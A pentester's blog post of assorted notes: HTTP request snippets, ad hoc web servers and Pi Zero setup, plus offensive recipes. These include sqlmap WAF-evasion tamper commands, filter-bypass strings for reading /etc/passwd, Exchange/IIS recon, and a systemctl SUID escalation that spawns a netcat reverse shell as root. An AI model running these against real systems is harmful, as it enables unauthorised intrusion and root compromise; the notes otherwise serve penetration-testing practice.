---
layout: post
title:  "No Context Notes Dump"
date:   2023-02-15 22:00:00 +0000
---

I need to get rid of some of these notes I've gathered over the years of being a pentester, that although are cool, I never ended up using. So I doubt there will be much in here, I'm not going to explain each one in detail, I just need them gone from my life.

## Golang HTTP

Within golang you can make http(s) requests like so.

```go
package main
import (
"fmt"
"io/ioutil"
"net/http"
)
func main() {
resp, err := http.Get("http://httpbin.org/anything")
if err != nil {
print(err)
}
defer resp.Body.Close()
body, err := ioutil.ReadAll(resp.Body)
if err != nil {
print(err)
}
fmt.Print(string(body))
}
{
  "args": {}, 
  "data": "", 
  "files": {}, 
  "form": {}, 
  "headers": {
    "Accept-Encoding": "gzip", 
    "Host": "httpbin.org", 
    "User-Agent": "Go-http-client/1.1", 
    "X-Amzn-Trace-Id": "Root=1-601d4277-4182fc5c6d8f318d425c0019"
  }, 
  "json": null, 
  "method": "GET", 
  "origin": "80.3.156.91", 
  "url": "http://httpbin.org/anything"
}
```

Status Codes

The below snippet to me forever to figure out.

```go
package main
import (
"fmt"
"net/http"
)
func main () {
resp, err := http.Get("https://jxtx.gitlab.io/")
if err != nil {
fmt.Println(err)
}
fmt.Println(resp.StatusCode, http.StatusText(resp.StatusCode))
}
```

## Web Servers

Each of these commands will run an ad hoc http static server in your current (or specified) directory, available at <http://localhost:8000>. Use this power wisely.

### Python 2.x

```
python -m SimpleHTTPServer 8000
```

### Python 3.x

```
python -m http.server 8000
```

### Twisted (Python)

```
twistd -n web -p 8000 --path .
python -c 'from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File("."))); reactor.run()'
```

### Ruby

```
ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'
```

### Ruby 1.9.2+

```
ruby -run -ehttpd . -p8000
```

### Perl

```perl
cpan HTTP::Server::Brick   # install dependency
perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8000); $s->mount("/"=>{path=>"."}); $s->start'
```

### http-server (Node.js)

```
npm install -g http-server   # install dependency
http-server -p 8000
```

### node-static (Node.js)

```
npm install -g node-static   # install dependency
static -p 8000
```

### PHP

```
php -S 127.0.0.1:8000
```

### busybox httpd

```
busybox httpd -f -p 8000
```

## Swift HTTP Request

### GET Request

```swift
import Foundation

// Set the URL the request is being made to.
let Grequest = URLRequest(url: NSURL(string: "https://httpbin.org/get")! as URL)
do {
    // Perform the request
    let response: AutoreleasingUnsafeMutablePointer<URLResponse?>? = nil
    let data = try NSURLConnection.sendSynchronousRequest(Grequest, returning: response)

    // Convert the data to JSON
    let jsonSerialized = try JSONSerialization.jsonObject(with: data, options: []) as? [String : Any]

    if let json = jsonSerialized{
        print(json)
    }
}

print("\n")

```

### POST Request

```swift
import Foundation

// Set the URL and method the request is being made to.
var Prequest = URLRequest(url: NSURL(string: "https://httpbin.org/post")! as URL)
Prequest.httpMethod = "POST"
Prequest.setValue("application/json", forHTTPHeaderField: "Content-Type")

// send test data
let data = "testtesttest"
let jsonData = try JSONEncoder().encode(data)
Prequest.httpBody = jsonData

do {
    // Perform the request
    let response: AutoreleasingUnsafeMutablePointer<URLResponse?>? = nil
    let data = try NSURLConnection.sendSynchronousRequest(Prequest, returning: response)

    // Convert the data to JSON
    let jsonSerialized = try JSONSerialization.jsonObject(with: data, options: []) as? [String : Any]

    if let json = jsonSerialized{
        print(json)
    }
}
```

## Swift UAC Prompt

```swift
var buf = [CChar](repeating: 0, count: 8192)
if let passphrase = readpassphrase("Enter passphrase: ", &buf, buf.count, 0),
    let passphraseStr = String(validatingUTF8: passphrase) {

    print(passphraseStr)
}
```

- <https://stackoverflow.com/questions/28596496/how-to-make-a-secure-password-input-field-in-a-command-line-app>

## JavaScript Prototype Pollution

Example

```javascript
var maliciousJson = '{ "myProperty" : "a", "proto" : { "isVulnerable" : true } }'; var testObject =jQuery.extend(true, {}, JSON.parse(maliciousJson )); if (typeof {}.isVulnerable !== 'undefined' &&{}.isVulnerable === true) {alert("Bad news :(\nYou're vulnerable to Prototype Pollution") } else {alert("All Good! :)\nYou're NOT vulnerable to Prototype Pollution") }
```

## sqlmap tamper scripts

You can use all the scripts one line

```
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ \
       --level=5 --risk=3 -p 'item1' \
--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

### General Tamper testing

```
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ \
       --level=5 --risk=3 -p 'item1' \
--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

#### MSSQL

```
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ \
       --level=5 --risk=3 -p 'item1' \
—tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

### MySQL

```
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ \
       --level=5 --risk=3 -p 'item1' \
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

## Nodejs axios

Basic Usage

```javascript
const axios = require('axios');
axios.get('https://jxtx.gitlab.io/&#39;)
.then( function (response) {
console.log(response.status);
console.log(response.headers);
});
```

```
Result
200
{ 'cache-control': 'max-age=600',
  'content-length': '6607',
  'content-type': 'text/html; charset=utf-8',
  expires: 'Thu, 04 Feb 2021 12:31:04 UTC',
  vary: 'Origin',
  date: 'Thu, 04 Feb 2021 12:21:04 GMT',
  connection: 'close' }
```

Pretty cool right? the full documentation is [here](https://github.com/axios/axios).

## Express Generator

express generator is amazing. with just a few commands I can make a very simple node.js app.

```
express --hbs myHandelApp

create : myHandelApp/
create : myHandelApp/public/
create : myHandelApp/public/javascripts/
create : myHandelApp/public/images/
create : myHandelApp/public/stylesheets/
create : myHandelApp/public/stylesheets/style.css
create : myHandelApp/routes/
create : myHandelApp/routes/index.js
create : myHandelApp/routes/users.js
create : myHandelApp/views/
create : myHandelApp/views/error.hbs
create : myHandelApp/views/index.hbs
create : myHandelApp/views/layout.hbs
create : myHandelApp/app.js
create : myHandelApp/package.json
create : myHandelApp/bin/
create : myHandelApp/bin/www

change directory:
$ cd myHandelApp

install dependencies:
$ npm install

run the app:
$ DEBUG=myhandelapp:* npm start
```

Then I just run `npm install && npm start` in that directory, and I have a barebones app.

### Editing

I’ve only had a small play, but in the `myHandelApp/routes/index.js` we see this code;

```javascript
var express = require('express');
var router = express.Router();
/* GET home page. */
router.get('/', function(req, res, next) {
res.render('index', { title: 'Express'} );
});
module.exports = router;
```

And in the `myHandelApp/views/index.hbs` we see this.

```html
<h1>{{title}}</h1>
<p>Welcome to {{title}}</p>
```

so changing them to include some test data like so;

```javascript
var express = require('express');
var router = express.Router();
/* GET home page. */
router.get('/', function(req, res, next) {
res.render('index', { title: 'Express', test: 'TESTING'} );
});
module.exports = router;
```

and

```html
<h1>{{title}}</h1>
<p>Welcome to {{title}}</p>
<p>testing {{test}}</p>
```

shows the results as expected

`$curl localhost:3000`

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Express</title>
    <link rel='stylesheet' href='/stylesheets/style.css' />
  </head>
  <body>
    <h1>Express</h1>
<p>Welcome to Express</p>
<p>testing TESTING</p>
</body>
</html>
```

## usb pi zero

The usb pizero is cool, but it takes a bit to initially connect to it.

### Setup

After flashing the sd card you need make some important changes to put the pi in “gadget mode”.

1. Open up the "boot" partition and edit "config.txt", adding `dtoverlay=dwc2` to the bottom
2. Open up "cmdline.txt" and add `modules-load=dwc2,g_ether` after `rootwait`
3. Create a new file named "ssh" in the boot folder
4. Pop your newly set up SD card into your Pi Zero

### Connecting

So this cant take forever, you need to have the `avahi-utils` package installed. Then connect the pi to your laptop and discover its hostname, by default that’s raspberrypi.local.

To discover however, can take a bit of patience. First find the new interfaces on your laptop.

```
$ ip --brief a

lo               UNKNOWN        127.0.0.1/8 ::1/128 
enp0s31f6        DOWN           169.254.7.100/16 
wlp61s0          UP             192.168.0.201/24 
virbr0           DOWN           192.168.122.1/24 
virbr0-nic       DOWN           
br-0f99f45e9a36  DOWN           172.18.0.1/16 
docker0          DOWN           172.17.0.1/16 fe80::42:83ff:fe7f:c3bc/64 
enp0s20f0u2      UP             
```

In this instance the `enp0s20f0u2` is new. It may have an IP address assigned to it. Once it does, run `avahi-resolve-host-name`.

`avahi-resolve-host-name raspberrypi.local`

Now comes the annoying/hard bit. we need to `ssh` to that address.

```
% ssh -6 pi@fe80::5ed3:f586:385a:1ef%enp0s20f0u2
ssh: connect to host fe80::5ed3:f586:385a:1ef%enp0s20f0u2 port 22: Connection timed out
```

Yeah, fun & games. I had to restart the avahi-daemon a few times, un plug & plug it back it… it seems a very weak connection. But it does connect eventually.

```
% ssh -6 pi@fe80::1716:8dfa:3382:935%enp0s20f0u2
Linux usbpizero 5.4.83+ #1379 Mon Dec 14 13:06:05 GMT 2020 armv6l
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 11 13:11:10 2021 from fe80::19e2:b7a5:fe55:43dd%usb0
pi@usbpizero:~ $
```

### References

- <https://askubuntu.com/questions/992388/ubuntu-avahi-daemon-cannot-find-raspberrypi-local>
- <https://raspberrypi.stackexchange.com/questions/57625/trying-to-get-ssh-over-usb-to-work-raspberry-pi-zero>
- <https://wiki.52pi.com/index.php/USB_dongle_for_Raspberry_Pi_Zero/Zero_W_SKU:EP-0097>
- <https://linux.die.net/man/8/avahi-daemon>
- <https://linux.die.net/man/1/avahi-browse>
- <https://techoverflow.net/2018/06/09/how-to-ssh-to-an-ipv6-address/>

## Quick wins

### Bypass Blacklisted

- `/bin/cat /ect/passwd`
- `/b’i’n/c’a’t e’t’c/p’a’s’s’w’o’r’d’`
- `/??'?'/?'a't /???/????'w'?`
- `/bin/nc 127.0.0.1 80`
- `/b'i'n/'n'c 2130706433 80`
- `/?'?'n/'n'? 2130706433 80`
- `/???/n? 2130706433 80`
- `echo =/*/*ss*`

Microsoft Exchange Client Access Server Information Disclosure
There are two metasploit modules for this, however sometimes a `curl` command is all thats needed.

#### iis_internal_ip

```
msfconsole -q \
           -x 'use auxiliary/scanner/http/iis_internal_ip' \
           -x 'set RHOSTS $target' \
           -x 'set RPORT 80' \
           -x 'set SSL false' \
           -x 'run'
```

```
RHOSTS => $target
RPORT => 80
SSL => false
[+] Location Header: http://10.8.9.40/RDWeb/
[+] Result for $target found Internal IP:  10.8.9.40
[+] Location Header: http://10.8.9.40/RDWeb/images
[+] Result for $target found Internal IP:  10.8.9.40
[+] Location Header: http://10.8.9.40/RDWeb/default.htm
[+] Result for $target found Internal IP:  10.8.9.40
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/iis_internal_ip) > 
```

#### owa_iis_internal_ip

```
msfconsole -q \
           -x 'use auxiliary/scanner/http/owa_iis_internal_ip' \
           -x 'set RHOSTS $target' \
           -x 'set RPORT 443' \
           -x 'set SSL true' \
           -x 'run'
```

```
: RHOSTS => $target
: RPORT => 443
: SSL => true
: [*] $target:443 - Checking HTTP headers
: [!] $target:443 - Nothing found
: [*] Scanned 1 of 1 hosts (100% complete)
: [*] Auxiliary module execution completed
: msf auxiliary(scanner/http/owa_iis_internal_ip) > 
```

#### cURL
  
```  
  curl -Ik \
    -X GET \
    -0 \
    https://$target/autodiscover/autodiscover.xml \
    -H $'Host:'
```

Notice the WWW-Authenticate header

```
HTTP/1.1 401 Unauthorized
Cache-Control: private
Server: Microsoft-IIS/8.5
request-id: 63ed5608-920f-4761-978a-54c192328582
X-SOAP-Enabled: True
X-WSSecurity-Enabled: True
X-WSSecurity-For: None
X-OAuth-Enabled: True
X-AspNet-Version: 4.0.30319
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
WWW-Authenticate: Basic realm="172.20.33.130"
X-Powered-By: ASP.NET
X-FEServer: PITSVCAS02
Date: Thu, 31 May 2018 13:38:02 GMT
Connection: close
Content-Length: 0
```

### IKE Aggressive Mode with Pre-Shared Key

`ike-scan -A -M --id=GroupVPN 98.100.193.10`

```
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
98.100.193.10 Aggressive Mode Handshake returned
                HDR=(CKY-R=92ca5e88033673ed)
                SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
                VID=12f5f28c457168a9702d9fe274cc0100 (Cisco Unity)
                VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
                VID=670df995033773edfe045a868dba66db
                VID=09002689dfd6b712 (XAUTH)
                KeyExchange(128 bytes)
                ID(Type=ID_IPV4_ADDR, Value=98.100.193.10)
                Nonce(20 bytes)
                Hash(20 bytes)
```

## TLS/SSL tips and tricks

- <https://cornerpirate.com/2021/02/04/verifying-insecure-ssl-tls-protocols-are-enabled/>

### BREACH

```
curl -i -H 'COOKIE:' -H 'Accept-Encoding: gzip,deflate' --insecure -v --output - http://app/auth/page
```

If you get junk back in the terminal the app is vulnerable.

### Dirty supported ciphers

```
nmap -p 443 --script ssl-enum-ciphers github.com | grep 'TLS|SSL' |awk '{print $2}'

TLSv1.2:
TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256
TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256
TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
TLS_RSA_WITH_AES_128_GCM_SHA256
TLS_RSA_WITH_AES_256_GCM_SHA384
TLS_RSA_WITH_AES_128_CBC_SHA256
TLS_RSA_WITH_AES_256_CBC_SHA256
TLS_RSA_WITH_AES_128_CBC_SHA
TLS_RSA_WITH_AES_256_CBC_SHA
TLSv1.3:
TLS_AKE_WITH_AES_128_GCM_SHA256
TLS_AKE_WITH_AES_256_GCM_SHA384
TLS_AKE_WITH_CHACHA20_POLY1305_SHA256
```

### Clients that argue

```shell
for ciphers in $(openssl ciphers -tls1 'ALL:eNULL' | sed -e 's/:/ /g'):; do openssl s_client -cipher $ciphers -tls1 example.com:443; done
```

### Windows fix

```
Disable-TlsCipherSuite -Name "TLS_DHE_RSA_WITH_AES_256_CBC_SHA"
Disable-TlsCipherSuite -Name "TLS_DHE_RSA_WITH_AES_128_CBC_SHA"
Disable-TlsCipherSuite -Name "TLS_RSA_WITH_AES_256_CBC_SHA256"
Disable-TlsCipherSuite -Name "TLS_RSA_WITH_AES_128_CBC_SHA256"
Disable-TlsCipherSuite -Name "TLS_RSA_WITH_AES_256_CBC_SHA"
Disable-TlsCipherSuite -Name "TLS_RSA_WITH_AES_128_CBC_SHA"
Disable-TlsCipherSuite -Name "TLS_RSA_WITH_3DES_EDE_CBC_SHA"
Disable-TlsCipherSuite -Name "TLS_DHE_DSS_WITH_AES_256_CBC_SHA256"
Disable-TlsCipherSuite -Name "TLS_DHE_DSS_WITH_AES_128_CBC_SHA256"
Disable-TlsCipherSuite -Name "TLS_DHE_DSS_WITH_AES_256_CBC_SHA"
Disable-TlsCipherSuite -Name "TLS_DHE_DSS_WITH_AES_128_CBC_SHA"
Disable-TlsCipherSuite -Name "TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA"
Disable-TlsCipherSuite -Name "TLS_PSK_WITH_AES_256_CBC_SHA384"
Disable-TlsCipherSuite -Name "TLS_PSK_WITH_AES_128_CBC_SHA256"
```

## systemctl escalation

If the output from `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` shows `/bin/systemctl` you can register a new service to escalate to root. To do this first run `priv=$(mktemp).service` then register the service.

```
echo '[Service]
ExecStart=/bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] [port] >/tmp/f"
[Install]
WantedBy=multi-user.target' >$priv
```

Then all you have to do is have a listener and run `/bin/systemctl link $priv` and then `/bin/systemctl enable --now $priv` and you then have a root shell.
